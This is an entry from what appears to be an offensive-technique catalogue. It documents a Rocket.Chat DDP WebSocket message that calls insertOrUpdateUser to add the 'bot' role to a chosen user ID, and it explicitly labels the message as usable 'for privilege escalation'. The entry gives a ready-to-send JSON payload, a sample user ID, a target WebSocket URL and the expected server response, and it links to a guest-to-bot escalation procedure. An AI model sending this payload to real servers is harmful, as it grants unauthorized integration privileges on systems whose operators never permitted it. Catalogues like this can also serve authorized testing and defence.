---
id: cmd-insertOrUpdateUser-ddp
data: >-
  {"msg":"method","method":"insertOrUpdateUser","params":[{"_id": "<USER_ID>",
  "roles": ["user", "bot"]}], "id":"17"}
tags:
  - ddp
  - role-update
type: command
output: 'null'
executor: websocket
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:26.957Z'
verified: false
validated: true
submitted: true
---
# insertOrUpdateUser-DDP-Message

## Command

```json
{"msg":"method","method":"insertOrUpdateUser","params":[{"_id": "<USER_ID>", "roles": ["user", "bot"]}], "id":"17"}
```

## Description

This DDP WebSocket message calls the insertOrUpdateUser method in Rocket.Chat to update a user's roles, adding 'bot' to enable integration management. Use in browser console or WebSocket client for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| _id | The target user's internal ID (e.g., "9HN4Brdmo2Qc2wsiX") | Yes |
| roles | Array of roles to set, preserving 'user' and adding 'bot' | Yes |
| id | Unique message ID for response tracking | Yes |

## Examples

### Basic Usage

```json
{"msg":"method","method":"insertOrUpdateUser","params":[{"_id": "9HN4Brdmo2Qc2wsiX", "roles": ["user", "bot"]}], "id":"17"}
```

### Advanced Usage

For multiple roles, extend the array: {"roles": ["user", "bot", "other"]}. Send via WebSocket to ws://target.com/websocket.

## Expected Output

Server responds with {"msg": "result", "result": {...updated user...}, "id": "17"} on success, or error on failure.

## Related

- [[procedures/Escalate-Guest-to-Bot-Role-via-insertOrUpdateUser]]
